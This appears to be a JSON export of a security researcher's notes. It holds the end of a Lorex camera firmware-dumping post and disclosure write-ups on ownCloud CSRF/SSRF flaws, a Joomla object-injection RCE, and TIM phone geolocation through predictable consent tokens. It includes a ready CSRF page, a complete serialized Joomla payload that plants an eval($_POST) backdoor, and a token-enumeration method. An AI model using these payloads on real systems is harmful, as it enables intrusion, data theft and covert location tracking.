Raspberry Piâ€™s GPIO pins were configured to match the SPI chipâ€™s MOSI, MISO, CLK, CS, and GND pins:\\\n\n![[notes/images/7.png]]\n\nA baremetal Debian distro has been loaded in the RPI2 Micro-SD card in order to start with a clean env:\n\n![[notes/images/8.png]]\n\nOnce the connections were secured, we used the open-source toolÂ `flashrom`Â to interact with the chip.\n\n```\nsudo flashrom -p linux_spi:dev=/dev/spidev0.0 -c \"W25Q64JV-.Q\" -r firmware_dump.bin\n```\n\nExecuting the command above initiated the dump. Within minutes, we had a binary file containing the cameraâ€™s firmware:\n\n![[notes/images/9.png]]\n\nA quick validation withÂ `hexdump`Â confirmed the dumpâ€™s integrity:\n\n![[xx.png]]\n\n\nThis validated our dumping process and ensured that the binary was ready for analysis with the well knownÂ `binwalk`Â . With this tool is possible to identify and extract files, filesystems and data that are embedded in the dumped firmware image. A quick look into it shows all the firmware sections without any extra steps related to some sort of encryption (luckily).\n\n_If you are particularly interested into encryption/decryption mechanisms of firmwares, the following resource goes into further details:Â [MindShaRE: Dealing with encrypted router firmware](https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware)._\n\n![[notes/images/10.png]]\n\nAlso, with BinVis ([https://binvis.io](https://binvis.io/)) is possible to generate a nice and useful visual analysis canvas of the binary file:\n\n![[notes/images/11.png]]\n\nThe whole firmware reverse engineering process, however, will be the core topic of the Part 2 of the series.\n\n## Step 3: Soldering into the Ethernet Pinout (Extra)\nThe Lorex 2K doesnâ€™t feature a traditional Ethernet port but its PCB includes test points for Ethernet signals. Could this be another interesting surface? We decided to find out.\n\nUsing an Ethernet pinout diagram as a reference, we identified the TX, RX, and GND test points on the PCB.\n\n![[notes/images/12.png]]\n\nAfter carefully soldering a peeled Ethernet cable to these points, we connected the other end to a laptop and began probing the network interface.\n\n![[notes/images/13.png]]\n\n## Conclusion\nOur hardware deep dive into the Lorex 2K IP Camera revealed both widely accessible and poorly secured interfaces that lead us to gain full firmware access opening scenarios to a wider attack surface. By methodically probing exposed pinpoints, it was possible to detect and abuse UART, SPI, and Ethernet connections, plus we could demonstrate how attackers can exploit even minor oversights. This research serves as a reminder to stay vigilant. For manufacturers, the challenge is clear: embed security into every stage of the product lifecycle, from design to post-deployment support. For security researchers, opportunities abound to collaborate and raise the bar for IoT safety. Ultimately, this underscores a fundamental truth: IoT security is only as strong as its weakest link. In an era where connected devices are ubiquitous, the stakes have never been higher.\n\nStay tuned for the upcoming parts!\n\n## References\n- [Pwn2Own IoT 2024 â€“ Lorex 2K Indoor Wi-Fi Security Camera](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf)\n- [Exploiting the Lorex 2K Indoor Wi-Fi at Pwn2Own Ireland](https://blog.infosectcbr.com.au/2024/12/exploiting-lorex-2k-indoor-wifi-at.html)\n- [MindShaRE: Dealing with encrypted router firmware](https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware)","lastmodified":"2025-04-14T14:14:33.956126402Z","tags":null},"/notes/Owncloud-Multiple-Vulnerabilities-CSRF-SSRF-and-Information-Leak":{"title":"Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)","content":"\n## Introduction\nDuring the research time in Hacktive Security I discovered several flaws in the [owncloud](https://owncloud.org/) product.\n\u003cbr\u003eOwncloud is an open-source cloud service similar to Google Drive. It is a good and popular piece of software and it was strange that the last CVE was from the far 2017 (2 years ago).So, we started looking at it and we disclosed 3 vulnerabilities related to the file sharing context, for sure a good attack vector.\n\nWhat I discovered could **compromise user's root folder** (read/write) via *CSRF*, cause an **authenticated Denial of Service** or **interact with local services** (*SSRF*) and **bypass password protected images**.\n\nWe reported all these issues in 17/10/2019, the ownCloud team fixed two of them after few months (SSRF and the bypass of protected images), but still do not have a patch for the reported CSRF. We tried to ping them multiple times and after 277 days since the first contact we decided to make them public (Disclosure Timeline at the end of the post).\n\n\n\n## Compromise userâ€™s root folder via CSRF\n\nBy exploiting a Cross-Site Request Forgery, it is possible to trick a user to share its whole **root folder** with another user or with a public link without authentication.\n\nThis is the vulnerable Request:\n\n```c\nPOST /ocs/v2.php/apps/files_sharing/api/v1/shares?format=json HTTP/1.1\nHost: mycloud.com:8081\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: ocqbn9pixyab=XXXX; oc_sessionPassphrase=XXXX\nContent-Length: 52\n\nshareType=0\u0026shareWith=attacker\u0026permissions=31\u0026path=./\n\n```\n\n*Note: **owncloud doesn't let users share their own root folder**, you cannot do it via GUI and if you make a forged request with '/' to indicate the root folder, an error message appears:*\n\n![img1](/notes/images/owncloud/1.png)\n\n*This was not a big deal because It was easily bypassable just by using './' as a payload inside the 'path' parameter:*\n\n![img2](/notes/images/owncloud/2.png)\n\n\nThe '**shareType**' indicates the type of sharing. In this case 0 means a share with another user specified in the **'shareWith'** parameter. A shareType 3 means a public share through a public link with 15 random characters. The entropy is too high to bruteforce and it is well implemented (this share type could be fine chaining an XSS). Last, but not least, **'permissions'** set to 31 means read and write permissions on the share.\n\nSimulating an offensive scenario, this could be the attacker's page:\n\n```html\n\u003cform name=\"csrf\" enctype=\"application/x-www-form-urlencoded\" method=POST action=https://TARGET/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json\u003e\n    \u003cinput type=hidden name=shareType value=\"0\"\u003e\n    \u003cinput type=hidden name=shareWith value=\"ATTACKER\"\u003e\n    \u003cinput type=hidden name=permissions value=\"31\"\u003e\n    \u003cinput type=hidden name=path value=\"./\"\u003e    \n\u003c/form\u003e\n\n\u003cscript\u003e\ndocument.csrf.submit();\n\u003c/script\u003e\n\n```\n\nVictim visits the page:\n\n![img3](/notes/images/owncloud/3.png)\n\nAnd the root folder is shared with the attacker:\n\n![img4](/notes/images/owncloud/4.png)\n\n\nIt would be cool to chain this vulnerability with a Cross-Site Scripting. Making a request from the same site doesn't trigger CORS, and the response is readable (in the response there is the public link). In this case, it could be just necessary to inject a script that makes a request to the vulnerable endpoint, read the response that contains the public link share, and send this one to the attacker. In this way, the whole root folder could be easily accessible from the internet and without authentication. But, sadly, this is not the case (and owncloud also employs a strict CSP). We only had a CSRF, so we could only perform blind POST requests.\n\nThis wannabe scenario is still possible with older browsers that do not support CORS validation or configured web server with too permissive policies. \n\n\n\n## Server Side Request Forgery + DOS\n\nA convenient functionality is to fetch files from a public link to your own (own-)cloud. When you receive a public link and you want to save the file in your cloud, you can use the arrow at the top right and it will do the hard work for you:\n\n![img5](/notes/images/owncloud/5.png)\n\nIn order to fetch the file, it has to know where you want to get the file, and it is specified in the following request :\n\n![img6](/notes/images/owncloud/6.png)\n\nFrom this parameter you can perform Server Side Requests to arbitrary local services, including the loopback:\n\n![img7](/notes/images/owncloud/7.png)\n\nIf we try this request we receive a callback from localhost:\n\n![img8](/notes/images/owncloud/8.png)\n\nThe docker provided from their official repository ships with Redis configured, that could be an interesting component to attack with our SSRF. In the first request we do not have many controllable parameters, just the URI (without CLRF). So we started to go deeper, because it has to make other requests in order to fetch a file from another cloud.\n\nWe started to analyze the flow between two valid clouds (thanks burp for the reverse proxy job) and we were right, we got multiple requests:\n\n![img9](/notes/images/owncloud/9.png)\n\n*(screen from ngrok - cleaner than burp requests)*\n\nMaybe we could be lucky and find something more useful in later requests (some parameters are reflected from response of the receiver cloud).. But nope. That was a fail. After 2 days of fuzzing/implementation of a valid clone of an owncloud receiver in python (and ngrok in order to avoid caching of a target domain), we stopped because it was not the right path, and we were losing too much time for a potential Authenticated RCE valid only for some environments. And, unfortunately, we couldn't achieve RCE.\n\nBy the way, SSRF can be used to scan the internal network for open services and/or interact with them, but if it doesn't reach a couple of addresses .. you have a nice little Denial Of Service (tested on a production server).\n\nBurp DOS configuration:\n\n![img10](/notes/images/owncloud/10.png)\n![img11](/notes/images/owncloud/11.png)\n![img12](/notes/images/owncloud/12.png)\n\nAnd few seconds laterâ€¦\n\n![img13](/notes/images/owncloud/13.png)\n\n## Bypass password protected images\n\nWhen you want to share to non authenticated users something in the cloud, you can use the 'Share with Public Link' option and protect it with a password in order to avoid other people watching it, if they eventually reach the link.\n\nWhen sharing Images, the generated token (the 15 characters long narrowed before) can be used in the preview functionality without authentication, bypassing the required password.\n\nThe protected shared image:\n\n![img14](/notes/images/owncloud/14.png)\n\nImage leaked:\n\n![img15](/notes/images/owncloud/15.png)\n\n## Timeline\n- 17/10/2019 - Issues reported\n- 15/11/2019 - Request an update since we didnâ€™t receive any reply\n- 13/12/2019 - 2 of 3 vulnerabilities fixed\n- 09/02/2020 - We requested an update for the third vulnerability\n- 09/02/2020 - Theyâ€™re working to patch it\n- 13/07/2010 - No patch, we informed them that we are going to make them public\n- 27/07/2020 - No reply, issues published","lastmodified":"2025-04-14T14:14:33.956126402Z","tags":null},"/notes/Rusty-Joomla-Remote-Code-Execution":{"title":"Rusty Joomla Remote Code Execution","content":"\n## Introduction\n\nDuring one of research activities in [Hacktive Security](http://hacktivesecurity.com/), we discovered an **undisclosed PHP Object Injection** on Joomla CMS from the 3.0.0 release to the 3.4.6 (releases from 2012 to December 2015) that leads to Remote Code Execution.\nA PHP Object Injection was discovered in the wild and patched in the 3.4.5 version (CVE-2015-8562), however, this vulnerability depends also a lot on the PHP release installed becoming not really trusty for all environments.\n\nComparing this RCE with CVE-2015-8562:\n- \\+ It is completely independent from the environment, becoming more reliable;\n- \\+ Vulnerable from the 3.0.0 to 3.4.6 (just one more minor release, not so much);\n- \\- Few releases vulnerable compared to CVE-2015-8562.\n\nHowever, the fun part of this vulnerability was the exploitation. There arenâ€™t a lot of blog posts about some more advanced and manual exploitation of PHP Object Injection (except for some good resources from RIPS) so this paper can be useful while exploiting it in other contexts.\n\n\n## How Sessions works\nJoomla sessions are stored in the database as PHP Objects and they are handled by PHP session functions. It is an interesting attack vector because sessions are also stored for unauthenticated users so an Object Injection there can lead to unauthenticated RCE.\n\nFunctions `read()` and `write()` defined in `libraries/joomla/session/storage/database.php` are set by the `session_set_save_handler()` in order to be used as read and write handlers for the `session_start()` call at `libraries/joomla/session/session.php:__start`\n\nThis is an example of a classic Joomla (before 3.4.6) session stored in the database for an unauthenticated user (at table `__session`):\n\n![img](/notes/images/rusty/0.png)\n\nThere are many objects defined, but the most interesting thing is how input parameters are handled in the session. If we make a regular action with parameters, these ones and the result message of the action, are stored in the session object like this:\n\n![img](/notes/images/rusty/1.png)\n\nWhen we perform POST requests in Joomla we usually have a 303 redirect that will redirect us to the result page. Thatâ€™s an important note for the exploitation, because the first request (with parameters) will only cause Joomla to perform the action and store (e.g. call the `write()` function) the session, then the 303 redirect will retrieve (e.g. call the `read()` function) it and display the message back to the user.\n\n## The vulnerability\nThis is the code for the read and write functions (just removed unnecessary code).\n\n![img|500](/notes/images/rusty/2.png)\n\nThe write function accept 2 parameters, the `session_id` (from the cookie) and the serialized object. Before storing data into the database there is an interesting replace of `\\x00\\x2a\\x00` (`chr(0).\"*\".chr(0)`) with `\\0\\0\\0`. Thatâ€™s because MySQL cannot save null bytes and `$protected` variables are prefixed with `\\x00\\x2a\\x00` in the serialized object. \n\nOn the other hand, when reading, the read function will replace `\\0\\0\\0` with `\\x00\\x2a\\x00` in order to reconstruct the original object.\n\nThe main issue with this replace is that itâ€™s replacing 3 bytes with 6 bytes:\n\n![img|500](/notes/images/rusty/3.png)\n\nThis behaviour has been introduced from the 3.0.0 version and affecting Joomla until 3.4.6. Starting from 3.4.7 the piece of code is still present but the session is base64 encoded and stored in the database.\n\nAs I said before, we can manipulate the session object through action parameters. In this way, we can inject `\\0\\0\\0` that will be replaced from the read function with 3 bytes, invalidating the object because of incorrect size. If we take the login form as a target and we put `my\\0\\0\\0username` in the username field, we end up with the following part of object in the database:\n\n```php\ns:8:s:\"username\";s:16:\"my\\0\\0\\0username\"\n```\n\nWhen the session object is read from the read function, `\\0\\0\\0` will be replaced as demonstrated before, assembling the following value:\n\n```php\ns:8:s:\"username\";s:16:\"myN\\*Nusername\" --\u003e Invalid Size\n```\nThe replaced string is only 13 bytes long but the declared string size is still 16!\nWe can now take this â€˜overflowâ€™ to our advantage and forge a new object that will lead us to the final goal... RCE! :)\n\n## Exploitation\nIn order to trigger our arbitrary object and achieve RCE we need two parameters in a row, the first one will cause the â€˜overflowâ€™ and the second will contain the last part of the exploit. The perfect target (included in a default installation) is the login form with the â€˜usernameâ€™ and â€˜passwordâ€™ fields.\n\nThatâ€™s the plan:\n- Overflow the username field with enough `\\0\\0\\0` in order to land in the password field\n- Reconstruct a valid object\n- Send the exploit\n- Trigger the exploit (with the redirect)\n\nWe know that we can downsize the string size. By doing that on the username field (that precede the password) we can fake it and let it ends inside the next parameter under our control.\n\n```php\n[..]s:8:s:\"username\";s:10:\"MYUSERNAME\";s:8:\"password\";s:10:\"MYPASSWORD\"[...]\n```\n\nAs you can see, the distance from the end of the username value and the start of the password is 27 bytes. The vulnerable replace let us decrease the value with a multiple of 3 (6 bytes - 3 bytes) so we need at least 8 times `\\0\\0\\0` in the username field that will cause a simple padding of 1 extra character in the second parameter in our exploit (in the POC I used 9 times `\\0\\0\\0` to be sure).\n\nIn bold, what unserialize read for the `username`:\n\n---\n(in database)\ns:8:s:\"username\";s:54:\"**\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0**\";s:8:\"password\";s:10:\"MYPASSWORD\"\n\n\n(after read and replace)\ns:8:s:\"username\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**SSWORD\"\n\n(Achieve Object injection):\ns:8:s:\"**username**\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**\";s:2:\"HS\":O:15:\"ObjectInjection\"[...]\n\n---\nWe have a stable way to inject an Object, now itâ€™s the time to craft it.\nWe can use the payload from the CVE-2015-8562 exploit as a starting point, however it requires some modification:\n\n```php\nO:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";\n```\n\nThis payload will instantiate a `JDatabaseDriverMysqli` object and assign an array of other objects in the `disconnectHandlers` attribute (a protected array variable). This is because the defined `__destruct` of this class will call `$this-\u003edisconnect()`, that leads to an interesting `call_user_func_array()`:\n\n![img8|500](/notes/images/rusty/4.png)\n\nFor each value in the `disconnectHandlers` array a `call_user_func_array()` is performed with a reference to the object (`\u0026$this`) as a parameter. Itâ€™s a good gadget, but we only have control over the function call and not on parameters. Thatâ€™s where `SimplePie` object came in our help.\n\nIn `SimplePie::init` (declared in `libraries/simplepie/simplepie.php`) we have different interesting gadgets, like the following:\n\n![img](/notes/images/rusty/5.png)\n\n\nThis is much more suitable, because we have a `call_user_func` with both function and parameter values under our control.\nHowever, thatâ€™s why I think the original payload wasnâ€™t working, there is a condition that must be met in order to receive this line of code: `$this-\u003ecache` must be declared and `$parsed_feed_url[â€˜schemeâ€™]` (the parsed url from $feed_url) needs to contain something.\nBypassing this condition was not so difficult. At first, with `cache_name_function` set to `system`, something like `https://something/;id` was enough. The first command fails but the semicolon do the rest.\n\nHowever, while developing the Metasploit module, I was not so happy about this solution. If the target environment have disabled functions like `system`, `exec`, `shell_exec`, etc., you cannot do a lot with this exploit, and I wanted to make something more suitable for more environments.\nSo, I moved back to the assert function and see if I could achieve the PHP code execution while respecting the condition. The only think the condition is checking for is a string that contains a valid schema (e.g. `http://` ), but this will cause a syntax error. In order to bypass it we can chain an OR (||) statement and trap the schema into a variable, like this:\n\n```php\n\u003cPHP CODE\u003e || $a=\"http//\";\n```\n\nWe were limited again against some special characters (like `?`) and from the `assert` function, so we need a way to move on a less restrictive environment. The first idea was to create a php file in the root directory with an `eval()`, but without the `?` the web server will not interpret our code. A `configuration.php` file is present in the root directory. It is nothing more than a class declaration with configuration parameters in it. We can append an eval at the end of this file and use it to execute PHP code with the following payload:\n\n```php\n file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\n```\n\nThat will result in the following call:\n\n```php\ncall_user_func(\"assert\",\"file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\")\n```\nAt the end, this is the final object:\n\n```php\ns:2:\"HS\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:125:\"file_put_contents('configuration.php','if(isset($_POST[\\'test\\'])) eval($_POST[\\'test\\']);', FILE_APPEND) || $a='http://wtf';\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}\n```\n\nNow we have everything necessary to develop a working exploit. Putting stuff together, we can send the exploit using the login form, this will store the malicious object into the database.\nThen we can follow the redirect from the first response and the payload will be retrieved from the database and unserialized from the `session_start()` function and .. we got RCE!\n\n\n## POC\n\u003ciframe width=\"480\" height=\"360\" src=\"https://www.youtube.com/embed/Z-GbT5YB-Tc\" frameborder=\"0\"\u003e \u003c/iframe\u003e\n\n## Exploit\n- https://www.exploit-db.com/exploits/47465\n- https://www.exploit-db.com/exploits/47539 (Metasploit)\n\n## References\n- https://nvd.nist.gov/vuln/detail/CVE-2015-8562\n- https://blog.ripstech.com/2018/woocommerce-php-object-injection/\n- https://www.php.net/manual/en/ref.session.php","lastmodified":"2025-04-14T14:14:33.956126402Z","tags":null},"/notes/TIM-Mobile-Phone-Geolocalization":{"title":"TIM Mobile Phone Geolocalization","content":"\nDuring the monthly research activity in [Hacktive Security](https://hacktivesecurity.com/), we found and went in depth with an interesting security issue allowing geolocation of mobile devices using TIM, an Italian communication provider. A malicious user could find the TIM customers geo-position by forcing the approval mechanism to allow the geopositional tracking. \n\nThe research has been focused on TerminalLocation API service provided by TIM on its API Store.\nTerminalLocation lets retrieve location of arbitrary devices by their phone numbers.\nBelow a service description provided by TIM:\n\nWith TIM API - TerminalLocation track and monitor the location of mobile devices using geographic coordinates (latitude and longitude), date and time. Location information are valid for TIM customers.â€œ\n\nLet's see how it works.\n\n## Overview of the service\n\nIn order to use the API service, we needed to sign up and then create a test application to retrieve an API key.\nHence, you can make a GET request to `/try/location/v1.1/\u003cPHONE_NUMBER\u003e` including the API key in the request header. If this is the first request targeting the phone number, an SMS is sent asking for an authorization approval to notify the current position at any time.\n\n\n![img1|200](/notes/images/tim/1.png)\n\nIn order to accept being geolocalized, the user has to click on the link in the message, which contains a base64 encoded user-token, and then click the confirmation button.\n\n![img2|200](/notes/images/tim/2.png)\n\nThis action triggers a GET request to /tim/api/unsecured/consenso/\\\u003cuser-token\\\u003e.\nEverything seems ok, users have to agree in order to use this service. But things turned out for the best, almost...\n\n## Vulnerability\n\nWe started to collect multiple tokens and we were surprised about their low entropy.\nThe base64 string sent within the link hides a 24 character token with both static and at first glance random values. If we break up some tokens, obtained within the same day and with few hours of delay, we noticed the following schema:  \n\n```\n\nXXXX AAAA YYYYYYYYYYYYYYY D  \nXXXX BBBB YYYYYYYYYYYYYYY E  \nXXXX CCCC YYYYYYYYYYYYYYY F  \n```\n(next day) \n```\n\nXXXX GGGG ZZZZZZZZZZZZZZZ H  \n```\n\nThe schema may be decoded as follows:\n- First part: the 4 Xs are always the same, they may be a static value\n- Second part: the 4 As, Bs, Cs and Ds are random characters\n- Third part: the 15 Ys and Zs are constants changing day by day; it may be related to the current date\n- Fourth part: the E, F, G, H are random characters\n\nWe have confirmed that these tokens are not randomly generated and they have pretty easylogic behind.\n\nThe crucial test consisted to send requests for 2 tokens in a very short period of time (2 seconds):\n\n```\nXXXX XXDD YYYYYYYYYYYYYYY A  \nXXXX XXFF YYYYYYYYYYYYYYY B\n```\n\n\nBingo!\nThey differ for just 3 characters and they are incremental!\n\nAt this point, we could easily guess with more confidence how tokens are generated: The first 4 characters are always the same, then 4 characters could be related to a timestamp, because they are consecutive, then 15 characters related to the current day and finally 1 random character in the last position.\nWith this insight we could create an enumeration tool, but another key point was reducing the character set:\nA request with a syntactically correct token returns an error message containing \"agreement not found\":\n\n![img3](/notes/images/tim/3.png)\n\nWith a malformed token (invalid length or invalid character set) it says Invalid parameters:\n\n![img3](/notes/images/tim/4.png)\n\nAfter few fuzzing requests we could determine that all characters were in a hexadecimal format, reducing a lot the enumeration (16 characters instead of 36 characters of all lowercase alphabet plus numbers).\n\n## Exploitation\n\nThe exploitation has been pretty easy:\n- Receive a token on our phone via SMS\n- Send the second token to the victim after few seconds\n- Deduce victimâ€™s token from our one.\n- Localize the phone!\n\nIn order to automate this process, we wrote a few lines in python.\nFirst, request two tokens with two seconds of delay (the first token to us and the second to the victim).\nThe timing is crucial because of its consecutive logic based on some sort of timestamp.\n\n![img4](/notes/images/tim/5.png)\n\nAttackerâ€™s token:\n\n\n![img5|300](/notes/images/tim/6.png)\n\n\nNow we have the token generated before the victimâ€™s one and we can easily predict it with an enumeration with 2 characters starting at the 6th position and one last character.\n\n![img6](/notes/images/tim/7.png)\n\nThanks to multi-threading and, of course, low entropy, this enumeration took less than 1 second to retrieve the victimâ€™s token.\nWith that token, we can now accept the agreement to the service with a PUT request to `/tim/api/unsecured/consenso/\u003ctoken\u003e?operazione=APPROVA` and geolocate the victim phone:\n\n![img7](/notes/images/tim/8.png)\n\n![img8](/notes/images/tim/8.png)\n\n\nAnd that's it :)","lastmodified":"2025-04-14T14:14:33.956126402Z","tags":null},"/notes/ZZTEmplate":{"title":"TODO","content":"","lastmodified":"2025-04-14T14:14:33.956126402Z","tags":null}}